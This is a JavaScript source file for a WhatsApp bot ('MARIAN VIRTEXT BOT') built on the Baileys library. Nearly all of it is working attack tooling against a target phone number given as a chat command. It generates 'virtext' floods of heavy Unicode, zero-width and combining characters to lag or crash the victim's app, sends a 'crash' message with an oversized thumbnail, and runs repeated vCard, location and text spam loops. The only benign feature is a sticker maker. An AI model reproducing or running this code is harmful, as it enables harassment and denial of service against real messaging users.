// ============================================================
// ⚡ MARIAN VIRTEXT BOT v12.0 - ULTIMATE LAG ATTACK ⚡
// ============================================================
// 🔥 VIRTEXT SYSTEM | AUTO LOGIN | ALL FEATURES WORKING 🔥
// ============================================================

const { 
    default: makeWASocket, 
    useMultiFileAuthState, 
    delay, 
    DisconnectReason, 
    makeCacheableSignalKeyStore,
    generateWAMessageFromContent,
    proto,
    getContentType,
    downloadContentFromMessage,
    Browsers,
    fetchLatestBaileysVersion
} = require("@whiskeysockets/baileys")

const pino = require("pino")
const fs = require('fs')
const path = require('path')
const axios = require('axios')
const chalk = require("chalk")
const { Boom } = require("@hapi/boom")
const Crypto = require('crypto')
const ff = require('fluent-ffmpeg')
const { tmpdir } = require('os')
const readline = require('readline')
const moment = require('moment-timezone')

// ==================== [ CONFIGURATION ] ====================
const CONFIG = {
    VERSION: "12.0.0",
    NAME: "MARIAN VIRTEXT BOT",
    SESSION_DIR: "marian_virtext",
    PREFIX: "/",
    AUTO_LOGIN: true,
    BROWSER: ["Ubuntu", "Chrome", "122.0.0.0"],
    TIMEZONE: "Asia/Jakarta",
    MAX_VIRTEXT: 10000
}

// ==================== [ VIRTEXT GENERATOR ] ====================
class VirtextGenerator {
    static UNICODE_BLOCKS = [
        // Mathematical Alphanumeric Symbols
        '𝔄', '𝔅', 'ℭ', '𝔇', '𝔈', '𝔉', '𝔊', 'ℌ', 'ℑ', '𝔍', '𝔎', '𝔏', '𝔐', '𝔑', '𝔒', '𝔓', '𝔔', 'ℜ', '𝔖', '𝔗', '𝔘', '𝔙', '𝔚', '𝔛', '𝔜', 'ℨ',
        '𝕬', '𝕭', '𝕮', '𝕯', '𝕰', '𝕱', '𝕲', '𝕳', '𝕴', '𝕵', '𝕶', '𝕷', '𝕸', '𝕹', '𝕺', '𝕻', '𝕼', '𝕽', '𝕾', '𝕿', '𝖀', '𝖁', '𝖂', '𝖃', '𝖄', '𝖅',
        '𝖠', '𝖡', '𝖢', '𝖣', '𝖤', '𝖥', '𝖦', '𝖧', '𝖨', '𝖩', '𝖪', '𝖫', '𝖬', '𝖭', '𝖮', '𝖯', '𝖰', '𝖱', '𝖲', '𝖳', '𝖴', '𝖵', '𝖶', '𝖷', '𝖸', '𝖹',
        '𝗔', '𝗕', '𝗖', '𝗗', '𝗘', '𝗙', '𝗚', '𝗛', '𝗜', '𝗝', '𝗞', '𝗟', '𝗠', '𝗡', '𝗢', '𝗣', '𝗤', '𝗥', '𝗦', '𝗧', '𝗨', '𝗩', '𝗪', '𝗫', '𝗬', '𝗭',
        '𝘈', '𝘉', '𝘊', '𝘋', '𝘌', '𝘍', '𝘎', '𝘏', '𝘐', '𝘑', '𝘒', '𝘓', '𝘔', '𝘕', '𝘖', '𝘗', '𝘘', '𝘙', '𝘚', '𝘛', '𝘜', '𝘝', '𝘞', '𝘟', '𝘠', '𝘡',
        '𝘼', '𝘽', '𝘾', '𝘿', '𝙀', '𝙁', '𝙂', '𝙃', '𝙄', '𝙅', '𝙆', '𝙇', '𝙈', '𝙉', '𝙊', '𝙋', '𝙌', '𝙍', '𝙎', '𝙏', '𝙐', '𝙑', '𝙒', '𝙓', '𝙔', '𝙕',
        '𝒜', 'ℬ', '𝒞', '𝒟', 'ℰ', 'ℱ', '𝒢', 'ℋ', 'ℐ', '𝒥', '𝒦', 'ℒ', 'ℳ', '𝒩', '𝒪', '𝒫', '𝒬', 'ℛ', '𝒮', '𝒯', '𝒰', '𝒱', '𝒲', '𝒳', '𝒴', '𝒵',
        '𝓐', '𝓑', '𝓒', '𝓓', '𝓔', '𝓕', '𝓖', '𝓗', '𝓘', '𝓙', '𝓚', '𝓛', '𝓜', '𝓝', '𝓞', '𝓟', '𝓠', '𝓡', '𝓢', '𝓣', '𝓤', '𝓥', '𝓦', '𝓧', '𝓨', '𝓩',
        // Special Heavy Characters
        '𑫀', '𑫁', '𑫂', '𑫃', '𑫄', '𑫅', '𑫆', '𑫇', '𑫈', '𑫉',
        '🩸', '💀', '☠️', '🔥', '⚡', '⚠️', '█', '▓', '▒', '░',
        // Zero Width Characters
        '‎', '‏', '​', '﻿',
        // Combining Characters
        '⃝', '⃞', '⃟', '⃠', '⃡', '⃣'
    ]

    static generateVirtext(length = 1000) {
        let virtext = "𝔉𝔄𝔎 𝔘 𝔊𝔄𝔎𝔘𝔖ℌ𝔖ℌ𝔖ℌ𝔖𝔅𝔖𝔅𝔇ℌ\n\n"
        virtext += "𝕱𝕬𝕶 𝖀 𝕲𝕬𝕶𝖀𝕾𝕳𝕾𝕳𝕾𝕳𝕾𝕭𝕾𝕭𝕯𝕳\n\n"
        virtext += "𝗠𝗔𝗥𝗜𝗔𝗡 𝗩𝗜𝗥𝗧𝗘𝗫𝗧 𝗦𝗬𝗦𝗧𝗘𝗠\n"
        virtext += "𝗟𝗔𝗚 𝗪𝗛𝗔𝗧𝗦𝗔𝗣𝗣 𝟭𝟬𝟬% 𝗧𝗥𝗨𝗦𝗧𝗘𝗗\n\n"
        
        for (let i = 0; i < length; i++) {
            const char = this.UNICODE_BLOCKS[Math.floor(Math.random() * this.UNICODE_BLOCKS.length)]
            virtext += char
            // Add line breaks every 100 chars for better effect
            if (i % 100 === 0 && i > 0) {
                virtext += '\n'
            }
        }
        
        return virtext
    }

    static generateHeavyVirtext() {
        let heavy = ""
        // Add multiple layers of unicode
        for (let i = 0; i < 50; i++) {
            heavy += "𝔄".repeat(100) + "\n"
            heavy += "𝕬".repeat(100) + "\n"
            heavy += "𑫀".repeat(50) + "\n"
            heavy += "█".repeat(200) + "\n"
            heavy += "‎".repeat(300) + "\n" // Zero width spaces
        }
        return heavy
    }

    static generateCustomVirtext(text, intensity = 10) {
        let result = ""
        for (let char of text) {
            // Convert each character to multiple unicode variations
            for (let i = 0; i < intensity; i++) {
                const unicodeChar = this.UNICODE_BLOCKS[
                    (char.charCodeAt(0) + i) % this.UNICODE_BLOCKS.length
                ]
                result += unicodeChar
            }
            result += " " // Space between characters
        }
        return result
    }
}

// ==================== [ UTILITY FUNCTIONS ] ====================
function log(type, message) {
    const colors = {
        'INFO': chalk.blue,
        'SUCCESS': chalk.green,
        'WARNING': chalk.yellow,
        'ERROR': chalk.red,
        'ATTACK': chalk.magenta,
        'VIRTEXT': chalk.cyan
    }
    const time = moment().tz(CONFIG.TIMEZONE).format('HH:mm:ss')
    const color = colors[type] || chalk.white
    console.log(color(`[${time}] [${type}] ${message}`))
}

function generateRandomId() {
    return Crypto.randomBytes(16).toString('hex')
}

// ==================== [ AUTO LOGIN SYSTEM ] ====================
async function autoLogin(sock) {
    if (!sock.authState.creds.registered) {
        log('INFO', 'Starting auto login system...')
        
        const rl = readline.createInterface({
            input: process.stdin,
            output: process.stdout
        })
        
        return new Promise((resolve) => {
            rl.question(chalk.yellow('📱 Enter your WhatsApp number (628xxx): '), async (phoneNumber) => {
                const cleanNumber = phoneNumber.replace(/[^0-9]/g, '')
                
                log('INFO', `Requesting pairing code for ${cleanNumber}...`)
                
                try {
                    // Delay to avoid spam detection
                    await delay(2000)
                    
                    let pairingCode = await sock.requestPairingCode(cleanNumber)
                    pairingCode = pairingCode?.match(/.{1,4}/g)?.join("-") || pairingCode
                    
                    console.log(chalk.bgGreen.black('\n══════════════════════════════════════════════════'))
                    console.log(chalk.white.bold.bgGreen(`   PAIRING CODE: ${pairingCode}   `))
                    console.log(chalk.bgGreen.black('══════════════════════════════════════════════════\n'))
                    
                    console.log(chalk.cyan('📲 INSTRUCTIONS:'))
                    console.log(chalk.white('1. Open WhatsApp on your phone'))
                    console.log(chalk.white('2. Settings → Linked Devices → Link a Device'))
                    console.log(chalk.white(`3. Enter code: ${pairingCode}`))
                    console.log(chalk.white('4. Approve within 2 minutes\n'))
                    
                    console.log(chalk.yellow('⏳ Waiting for approval...'))
                    
                    rl.close()
                    resolve(cleanNumber)
                    
                } catch (error) {
                    log('ERROR', `Login failed: ${error.message}`)
                    console.log(chalk.red('\n[✗] Login failed! Try again later.'))
                    rl.close()
                    process.exit(1)
                }
            })
        })
    }
    return null
}

// ==================== [ VIRTEXT ATTACK SYSTEM ] ====================
class VirtextAttack {
    constructor(sock) {
        this.sock = sock
    }
    
    async sendVirtext(target, length = 1000, count = 1) {
        log('VIRTEXT', `Sending VIRTEXT to ${target} (${length} chars, ${count}x)`)
        
        for (let i = 0; i < count; i++) {
            const virtext = VirtextGenerator.generateVirtext(length)
            await this.sock.sendMessage(target, { text: virtext }).catch(() => {})
            await delay(500)
        }
        
        return true
    }
    
    async sendHeavyVirtext(target, count = 3) {
        log('VIRTEXT', `Sending HEAVY VIRTEXT to ${target} (${count}x)`)
        
        for (let i = 0; i < count; i++) {
            const heavy = VirtextGenerator.generateHeavyVirtext()
            await this.sock.sendMessage(target, { text: heavy }).catch(() => {})
            await delay(800)
        }
        
        return true
    }
    
    async sendCustomVirtext(target, text, intensity = 10, count = 1) {
        log('VIRTEXT', `Sending custom VIRTEXT to ${target}`)
        
        const custom = VirtextGenerator.generateCustomVirtext(text, intensity)
        for (let i = 0; i < count; i++) {
            await this.sock.sendMessage(target, { text: custom }).catch(() => {})
            await delay(600)
        }
        
        return true
    }
    
    async virtextBomb(target, attacks = 5) {
        log('VIRTEXT', `Starting VIRTEXT BOMB on ${target} (${attacks} attacks)`)
        
        for (let i = 0; i < attacks; i++) {
            // Mix different types of virtext
            await this.sendVirtext(target, 500, 1)
            await delay(300)
            await this.sendHeavyVirtext(target, 1)
            await delay(300)
            await this.sendCustomVirtext(target, "MARIAN LAG SYSTEM", 15, 1)
            await delay(300)
        }
        
        return true
    }
}

// ==================== [ BUG ATTACK SYSTEMS ] ====================
class BugSystem {
    constructor(sock) {
        this.sock = sock
    }
    
    async bugV1(target, count = 3) {
        log('ATTACK', `BugV1 on ${target} (${count}x)`)
        
        for (let i = 0; i < count; i++) {
            const vcard = `BEGIN:VCARD\nVERSION:3.0\nFN:MARIAN_BUG_${i}\nTEL;type=CELL:${Math.random().toString().slice(2,12)}\nEND:VCARD`
            await this.sock.sendMessage(target, {
                contacts: {
                    displayName: `BUG_${i}`,
                    contacts: [{ vcard }]
                }
            }).catch(() => {})
            await delay(500)
        }
        
        return true
    }
    
    async bugV2(target, count = 5) {
        log('ATTACK', `BugV2 on ${target} (${count}x)`)
        
        for (let i = 0; i < count; i++) {
            await this.sock.sendMessage(target, {
                location: {
                    degreesLatitude: Math.random() * 180 - 90,
                    degreesLongitude: Math.random() * 360 - 180,
                    name: "BUG_" + "A".repeat(200),
                    address: "MARIAN VIRTEXT SYSTEM"
                }
            }).catch(() => {})
            await delay(400)
        }
        
        return true
    }
    
    async crash(target) {
        log('ATTACK', `Crash attack on ${target}`)
        
        await this.sock.sendMessage(target, {
            text: "💀 MARIAN VIRTEXT CRASH",
            contextInfo: {
                externalAdReply: {
                    title: "SYSTEM CRASH",
                    body: "DIIISSJJSS 100% TRUSTED",
                    thumbnail: Buffer.alloc(500000),
                    sourceUrl: "https://marian.crash"
                }
            }
        }).catch(() => {})
        
        return true
    }
    
    async spam(target, count = 15, message = "MARIAN VIRTEXT SPAM") {
        log('ATTACK', `Spam on ${target} (${count} messages)`)
        
        for (let i = 1; i <= count; i++) {
            await this.sock.sendMessage(target, {
                text: `[${i}/${count}] ${message}\n${"█".repeat(30)}`
            }).catch(() => {})
            await delay(300)
        }
        
        return true
    }
}

// ==================== [ STICKER MAKER ] ====================
class StickerMaker {
    static async createSticker(imageBuffer) {
        try {
            const tmpFileOut = path.join(tmpdir(), `${generateRandomId()}.webp`)
            const tmpFileIn = path.join(tmpdir(), `${generateRandomId()}.jpg`)
            
            fs.writeFileSync(tmpFileIn, imageBuffer)
            
            await new Promise((resolve, reject) => {
                ff(tmpFileIn)
                    .on('error', reject)
                    .on('end', resolve)
                    .addOutputOptions([
                        "-vcodec", "libwebp",
                        "-vf", "scale=512:512:force_original_aspect_ratio=decrease,format=rgba,pad=512:512:(ow-iw)/2:(oh-ih)/2:color=#00000000,setsar=1"
                    ])
                    .toFormat('webp')
                    .save(tmpFileOut)
            })
            
            const stickerBuffer = fs.readFileSync(tmpFileOut)
            fs.unlinkSync(tmpFileOut)
            fs.unlinkSync(tmpFileIn)
            
            return stickerBuffer
        } catch (error) {
            log('ERROR', `Sticker creation failed: ${error.message}`)
            return null
        }
    }
}

// ==================== [ COMMAND HANDLER ] ====================
class CommandHandler {
    constructor(sock, virtextAttack, bugSystem) {
        this.sock = sock
        this.virtext = virtextAttack
        this.bugs = bugSystem
    }
    
    async handle(from, body, quoted) {
        if (!body.startsWith(CONFIG.PREFIX)) return
        
        const args = body.slice(CONFIG.PREFIX.length).trim().split(/ +/)
        const command = args.shift().toLowerCase()
        const text = args.join(' ')
        
        // Log command
        const sender = from.split('@')[0]
        log('INFO', `${sender}: ${body}`)
        
        try {
            switch(command) {
                // ========== VIRTEXT COMMANDS ==========
                case 'virtext':
                case 'vt':
                    const target1 = text.split(' ')[0]?.replace(/[^0-9]/g, '') + '@s.whatsapp.net'
                    const length1 = parseInt(text.split(' ')[1]) || 1000
                    const count1 = parseInt(text.split(' ')[2]) || 1
                    await this.sock.sendMessage(from, { text: '🔤 Sending VIRTEXT...' })
                    await this.virtext.sendVirtext(target1, length1, count1)
                    await this.sock.sendMessage(from, { text: '✅ VIRTEXT delivered!' })
                    break
                    
                case 'heavyvt':
                case 'hvt':
                    const target2 = text.split(' ')[0]?.replace(/[^0-9]/g, '') + '@s.whatsapp.net'
                    const count2 = parseInt(text.split(' ')[1]) || 3
                    await this.sock.sendMessage(from, { text: '💀 Sending HEAVY VIRTEXT...' })
                    await this.virtext.sendHeavyVirtext(target2, count2)
                    await this.sock.sendMessage(from, { text: '☠️ HEAVY VIRTEXT delivered!' })
                    break
                    
                case 'customvt':
                case 'cvt':
                    const target3 = text.split(' ')[0]?.replace(/[^0-9]/g, '') + '@s.whatsapp.net'
                    const customText = text.split(' ').slice(1).join(' ') || "MARIAN VIRTEXT"
                    await this.sock.sendMessage(from, { text: '🎨 Creating custom VIRTEXT...' })
                    await this.virtext.sendCustomVirtext(target3, customText, 15, 1)
                    await this.sock.sendMessage(from, { text: '✅ Custom VIRTEXT delivered!' })
                    break
                    
                case 'vtbomb':
                case 'virtextbomb':
                    const target4 = text.split(' ')[0]?.replace(/[^0-9]/g, '') + '@s.whatsapp.net'
                    const attacks = parseInt(text.split(' ')[1]) || 5
                    await this.sock.sendMessage(from, { text: '💣 Starting VIRTEXT BOMB...' })
                    await this.virtext.virtextBomb(target4, attacks)
                    await this.sock.sendMessage(from, { text: '⚡ VIRTEXT BOMB completed!' })
                    break
                
                // ========== BUG COMMANDS ==========
                case 'bug':
                    const target5 = text.split(' ')[0]?.replace(/[^0-9]/g, '') + '@s.whatsapp.net'
                    const bugCount = parseInt(text.split(' ')[1]) || 3
                    await this.sock.sendMessage(from, { text: '🔄 Sending BugV1...' })
                    await this.bugs.bugV1(target5, bugCount)
                    await this.sock.sendMessage(from, { text: '✅ BugV1 delivered!' })
                    break
                    
                case 'bug2':
                    const target6 = text.split(' ')[0]?.replace(/[^0-9]/g, '') + '@s.whatsapp.net'
                    const bug2Count = parseInt(text.split(' ')[1]) || 5
                    await this.sock.sendMessage(from, { text: '💀 Sending BugV2...' })
                    await this.bugs.bugV2(target6, bug2Count)
                    await this.sock.sendMessage(from, { text: '☠️ BugV2 delivered!' })
                    break
                    
                case 'crash':
                case 'crasher':
                    const target7 = text.split(' ')[0]?.replace(/[^0-9]/g, '') + '@s.whatsapp.net'
                    await this.sock.sendMessage(from, { text: '⚡ Launching Crasher...' })
                    await this.bugs.crash(target7)
                    await this.sock.sendMessage(from, { text: '✅ Crasher delivered!' })
                    break
                    
                case 'spam':
                    const target8 = text.split(' ')[0]?.replace(/[^0-9]/g, '') + '@s.whatsapp.net'
                    const spamCount = Math.min(parseInt(text.split(' ')[1]) || 15, 100)
                    const spamMsg = text.split(' ').slice(2).join(' ') || "MARIAN VIRTEXT SPAM"
                    await this.sock.sendMessage(from, { text: `💣 Spamming ${spamCount} messages...` })
                    await this.bugs.spam(target8, spamCount, spamMsg)
                    await this.sock.sendMessage(from, { text: `✅ ${spamCount} spam messages sent!` })
                    break
                    
                case 'multi':
                    const target9 = text.split(' ')[0]?.replace(/[^0-9]/g, '') + '@s.whatsapp.net'
                    await this.sock.sendMessage(from, { text: '🔥 Starting multi-attack...' })
                    await this.virtext.sendVirtext(target9, 500, 2)
                    await delay(1000)
                    await this.bugs.bugV1(target9, 2)
                    await delay(1000)
                    await this.bugs.crash(target9)
                    await delay(1000)
                    await this.virtext.sendHeavyVirtext(target9, 2)
                    await this.sock.sendMessage(from, { text: '☠️ Multi-attack completed!' })
                    break
                
                // ========== STICKER COMMAND ==========
                case 's':
                case 'sticker':
                    if (quoted && getContentType(quoted) === 'imageMessage') {
                        await this.sock.sendMessage(from, { text: '🔄 Creating sticker...' })
                        const stream = await downloadContentFromMessage(quoted.imageMessage, 'image')
                        let buffer = Buffer.from([])
                        for await (const chunk of stream) {
                            buffer = Buffer.concat([buffer, chunk])
                        }
                        const sticker = await StickerMaker.createSticker(buffer)
                        if (sticker) {
                            await this.sock.sendMessage(from, { sticker: sticker })
                            await this.sock.sendMessage(from, { text: '✅ Sticker created successfully!' })
                        } else {
                            await this.sock.sendMessage(from, { text: '❌ Failed to create sticker' })
                        }
                    } else {
                        await this.sock.sendMessage(from, { text: '❌ Reply to an image first!' })
                    }
                    break
                
                // ========== INFO COMMANDS ==========
                case 'menu':
                case 'help':
                    const menu = `*🤖 MARIAN VIRTEXT BOT v${CONFIG.VERSION}*\n\n` +
                                `*🔤 VIRTEXT ATTACKS:*\n` +
                                `• /virtext [num] [length] [count] - Send virtext\n` +
                                `• /heavyvt [num] [count] - Heavy virtext\n` +
                                `• /customvt [num] [text] - Custom virtext\n` +
                                `• /vtbomb [num] [attacks] - Virtext bomb\n\n` +
                                `*💀 BUG ATTACKS:*\n` +
                                `• /bug [num] [count] - Bug VCard\n` +
                                `• /bug2 [num] [count] - Bug Location\n` +
                                `• /crash [num] - Crash WhatsApp\n` +
                                `• /spam [num] [count] [msg] - Spam\n` +
                                `• /multi [num] - Multi-attack\n\n` +
                                `*🎨 TOOLS:*\n` +
                                `• /s - Create sticker (reply image)\n\n` +
                                `*ℹ️ INFO:*\n` +
                                `• /status - Bot status\n` +
                                `• /ping - Test connection\n\n` +
                                `*Example:* /virtext 6281234567890 2000 3\n` +
                                `_Prefix: ${CONFIG.PREFIX}_`
                    await this.sock.sendMessage(from, { text: menu })
                    break
                    
                case 'status':
                    const status = `*🔧 MARIAN VIRTEXT STATUS*\n\n` +
                                  `Version: v${CONFIG.VERSION}\n` +
                                  `Prefix: ${CONFIG.PREFIX}\n` +
                                  `Browser: ${CONFIG.BROWSER[1]}\n` +
                                  `Uptime: ${process.uptime().toFixed(0)}s\n` +
                                  `VIRTEXT System: ACTIVE 🔤\n` +
                                  `Sticker Maker: WORKING ✅\n` +
                                  `Status: ONLINE ⚡`
                    await this.sock.sendMessage(from, { text: status })
                    break
                    
                case 'ping':
                    const start = Date.now()
                    await this.sock.sendMessage(from, { text: '🏓 Pong!' })
                    const latency = Date.now() - start
                    await this.sock.sendMessage(from, {
                        text: `*PONG!*\nLatency: ${latency}ms\nStatus: ULTRA FAST ⚡`
                    })
                    break
                    
                case 'demo':
                    // Demo virtext
                    const demoText = VirtextGenerator.generateVirtext(100)
                    await this.sock.sendMessage(from, { text: demoText })
                    break
                    
                default:
                    await this.sock.sendMessage(from, {
                        text: `❌ Unknown command: ${command}\nType ${CONFIG.PREFIX}menu for help`
                    })
            }
        } catch (error) {
            log('ERROR', `Command ${command} failed: ${error.message}`)
            await this.sock.sendMessage(from, { text: `❌ Command failed: ${error.message}` })
        }
    }
}

// ==================== [ MAIN BOT ] ====================
async function startBot() {
    log('SYSTEM', `Starting MARIAN VIRTEXT BOT v${CONFIG.VERSION}`)
    
    // Clean old session if exists
    if (fs.existsSync(CONFIG.SESSION_DIR)) {
        const files = fs.readdirSync(CONFIG.SESSION_DIR)
        if (files.length > 5) {
            log('WARNING', 'Cleaning old session...')
            fs.rmSync(CONFIG.SESSION_DIR, { recursive: true })
        }
    }
    
    // Initialize WhatsApp
    const { state, saveCreds } = await useMultiFileAuthState(CONFIG.SESSION_DIR)
    const { version } = await fetchLatestBaileysVersion()
    
    const sock = makeWASocket({
        version,
        logger: pino({ level: 'silent' }),
        auth: {
            creds: state.creds,
            keys: makeCacheableSignalKeyStore(state.keys, pino({ level: 'fatal' }))
        },
        browser: CONFIG.BROWSER,
        connectTimeoutMs: 60000,
        keepAliveIntervalMs: 20000,
        markOnlineOnConnect: true,
        syncFullHistory: false,
        retryRequestDelayMs: 1000
    })
    
    // Initialize attack systems
    const virtextAttack = new VirtextAttack(sock)
    const bugSystem = new BugSystem(sock)
    const handler = new CommandHandler(sock, virtextAttack, bugSystem)
    
    // Auto login if needed
    if (CONFIG.AUTO_LOGIN) {
        await autoLogin(sock)
    }
    
    // Event handlers
    sock.ev.on('creds.update', saveCreds)
    
    sock.ev.on('connection.update', (update) => {
        const { connection, lastDisconnect } = update
        
        if (connection === 'close') {
            const reason = new Boom(lastDisconnect?.error)?.output?.statusCode
            log('WARNING', `Connection closed: ${reason}`)
            
            if (reason !== DisconnectReason.loggedOut) {
                log('SYSTEM', 'Auto-reconnecting in 3s...')
                setTimeout(startBot, 3000)
            }
        }
        
        if (connection === 'open') {
            log('SUCCESS', 'MARIAN VIRTEXT BOT connected!')
            
            console.log(chalk.green.bold('\n[✓] MARIAN VIRTEXT BOT v12.0 ONLINE!'))
            console.log(chalk.cyan(`Device: ${CONFIG.BROWSER.join(' ')}`))
            console.log(chalk.yellow(`Prefix: ${CONFIG.PREFIX}`))
            console.log(chalk.magenta('\n🔥 VIRTEXT COMMANDS:'))
            console.log(chalk.white('• /virtext [num] - Unicode lag attack'))
            console.log(chalk.white('• /heavyvt [num] - Heavy virtext'))
            console.log(chalk.white('• /vtbomb [num] - Virtext bomb'))
            console.log(chalk.white('• /s - Sticker maker (reply image)'))
            console.log(chalk.white('• /menu - Show all commands\n'))
            
            // Welcome message with virtext
            const welcome = `*⚡ MARIAN VIRTEXT BOT v${CONFIG.VERSION}*\n\n` +
                           `✅ Connected successfully!\n` +
                           `📱 Device: ${CONFIG.BROWSER.join(' ')}\n` +
                           `⚡ Prefix: ${CONFIG.PREFIX}\n` +
                           `🔤 VIRTEXT System: ACTIVE\n` +
                           `🎨 Sticker Maker: WORKING\n\n` +
                           `Type ${CONFIG.PREFIX}menu for all commands\n` +
                           `_System: VIRTEXT EDITION | LAG WHATSAPP 100%_`
            
            if (sock.user?.id) {
                sock.sendMessage(sock.user.id, { text: welcome })
            }
        }
    })
    
    sock.ev.on('messages.upsert', async ({ messages }) => {
        try {
            const m = messages[0]
            if (!m.message || m.key.fromMe) return
            
            const from = m.key.remoteJid
            const type = getContentType(m.message)
            
            // Auto read
            await sock.readMessages([m.key])
            
            // Get message body
            let body = ''
            if (type === 'conversation') {
                body = m.message.conversation
            } else if (type === 'extendedTextMessage') {
                body = m.message.extendedTextMessage.text
            }
            
            // Get quoted message
            const quoted = m.message[type]?.contextInfo?.quotedMessage || null
            
            // Handle command
            if (body && body.startsWith(CONFIG.PREFIX)) {
                await handler.handle(from, body, quoted)
            }
            
        } catch (error) {
            log('ERROR', `Message handling error: ${error.message}`)
        }
    })
}

// ==================== [ STARTUP ] ====================
console.clear()
console.log(chalk.bgRed.black('\n ⚡ MARIAN VIRTEXT BOT v12.0 - ULTIMATE LAG ATTACK ⚡ \n'))
console.log(chalk.yellow('🔥 VIRTEXT SYSTEM | AUTO LOGIN | STICKER WORKING 🔥\n'))

// Handle errors
process.on('uncaughtException', (error) => {
    log('ERROR', `Uncaught exception: ${error.message}`)
})

process.on('unhandledRejection', (reason) => {
    log('ERROR', `Unhandled rejection: ${reason}`)
})

// Start bot
startBot().catch(error => {
    log('ERROR', `Startup failed: ${error.message}`)
    log('SYSTEM', 'Restarting in 5 seconds...')
    setTimeout(startBot, 5000)
})
